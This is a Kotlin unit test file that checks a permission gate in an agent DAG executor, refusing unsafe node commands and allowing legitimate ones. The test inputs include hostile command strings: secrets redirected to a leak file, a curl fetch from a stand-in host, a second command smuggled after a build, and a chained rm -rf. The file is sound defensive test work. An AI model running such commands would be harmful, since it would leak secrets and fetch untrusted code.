/* SPDX-License-Identifier: AGPL-3.0-only */
package atropos.core.dag

import atropos.core.policy.ActionActor
import atropos.core.policy.AgencyDisposition
import atropos.core.policy.BoundedAgencyGate
import atropos.core.policy.ExecutionPolicyEngine
import atropos.core.territory.TerritoryGrantService
import atropos.core.territory.TerritoryService
import atropos.core.territory.TerritoryStore
import atropos.core.policy.PolicyActionClass
import java.nio.file.Files
import java.nio.file.Path
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * Batch 6 — DAG node execution answers to the single permission authority.
 *
 * Before this batch the only check was
 * `AutonomyPolicyEngine.evaluate(DAG_CONTROL)`, whose rule table returns
 * `allowed = true` unconditionally, so every case marked "permitted before" here
 * genuinely ran.
 */
class DagNodeProposalsTest {

    private val TEST_ACTOR = ActionActor.HierarchyNode("dag-executor", "node-1")

    private fun repo(): Path = Files.createTempDirectory("atropos-dag-agency-")

    private fun disposition(
        action: DagNodeAction,
        payload: String?,
        territory: List<String> = emptyList()
    ): AgencyDisposition? {
        val repoRoot = repo()
        val proposal = DagNodeProposals.forNode(action, payload, territory, repoRoot, TEST_ACTOR) ?: return null

        // The dispatcher grants the node its declared territory, exactly as
        // DagExecutionService does before evaluating. Without this the node
        // holds nothing and is refused — which Batch 8 proves separately.
        val grants = TerritoryGrantService(TerritoryService(TerritoryStore(repoRoot)))
        grants.grantToNode(ActionActor.HumanOwner, TEST_ACTOR, territory)

        return BoundedAgencyGate(ExecutionPolicyEngine(repoRoot), grants).evaluate(proposal).disposition
    }

    @Test
    fun a_chained_command_node_is_refused() {
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.RUN_COMMAND, "./gradlew test && rm -rf /tmp/x")
        )
    }

    @Test
    fun a_redirecting_command_node_is_refused() {
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.RUN_COMMAND, "cat secrets.env > /tmp/leak")
        )
    }

    @Test
    fun a_network_command_node_is_refused() {
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.RUN_COMMAND, "curl http://example.invalid/payload")
        )
    }

    @Test
    fun a_build_node_cannot_smuggle_a_second_command() {
        // Proposing BUILD_TEST would have judged this on its first token alone.
        // It is proposed as SHELL because `sh -c` is what actually runs it.
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.RUN_BUILD, "./gradlew build && curl http://example.invalid")
        )
    }

    @Test
    fun a_file_mutation_node_with_no_territory_is_refused() {
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.CREATE_FILE, null, territory = emptyList())
        )
    }

    @Test
    fun a_file_mutation_node_targeting_a_forbidden_path_is_refused() {
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.EDIT_FILE, null, territory = listOf("build/output.jar"))
        )
        assertEquals(
            AgencyDisposition.POLICY_BLOCKED,
            disposition(DagNodeAction.EDIT_FILE, null, territory = listOf(".git/config"))
        )
    }

    @Test
    fun legitimate_nodes_are_still_allowed() {
        assertEquals(
            AgencyDisposition.ALLOWED,
            disposition(DagNodeAction.RUN_TEST, "./gradlew test")
        )
        assertEquals(
            AgencyDisposition.ALLOWED,
            disposition(DagNodeAction.RUN_COMMAND, "ls src")
        )
        assertEquals(
            AgencyDisposition.ALLOWED,
            disposition(DagNodeAction.EDIT_FILE, null, territory = listOf("src/main/kotlin/atropos/Foo.kt"))
        )
        assertEquals(
            AgencyDisposition.ALLOWED,
            disposition(DagNodeAction.COMPILE_GATE, "./gradlew compileKotlin")
        )
    }

    @Test
    fun a_provider_call_node_proposes_a_free_provider() {
        val proposal = DagNodeProposals.forNode(
            DagNodeAction.PROVIDER_CALL, "do the thing", emptyList(), repo(), TEST_ACTOR
        )
        assertNotNull(proposal)
        assertEquals(PolicyActionClass.PROVIDER_CALL, proposal.actionClass)
        assertTrue(!proposal.paidProvider, "the DAG must not dispatch to a paid provider")
        assertEquals(
            AgencyDisposition.ALLOWED,
            disposition(DagNodeAction.PROVIDER_CALL, "do the thing")
        )
    }

    @Test
    fun command_nodes_are_proposed_as_shell_because_that_is_what_runs_them() {
        val proposal = DagNodeProposals.forNode(
            DagNodeAction.RUN_BUILD, "./gradlew build", listOf("src"), repo(), TEST_ACTOR
        )
        assertNotNull(proposal)
        assertEquals(PolicyActionClass.SHELL, proposal.actionClass)
        assertEquals(listOf("./gradlew", "build"), proposal.command)
        assertEquals(listOf("src"), proposal.targetPaths)
    }

    @Test
    fun only_the_non_executing_actions_skip_the_gate() {
        DagNodeAction.entries.forEach { action ->
            val proposal = DagNodeProposals.forNode(action, "./gradlew test", listOf("src"), repo(), TEST_ACTOR)
            if (DagNodeProposals.executesNothing(action)) {
                assertNull(proposal, "$action executes nothing and makes no proposal")
            } else {
                assertNotNull(proposal, "$action executes something and must be proposed")
            }
        }

        // Pinned explicitly so a future action cannot quietly join the skip list.
        assertEquals(
            setOf(
                DagNodeAction.POLICY_CHECK,
                DagNodeAction.SECRET_CHECK,
                DagNodeAction.TERRITORY_CHECK
            ),
            DagNodeAction.entries.filter(DagNodeProposals::executesNothing).toSet()
        )
    }
}
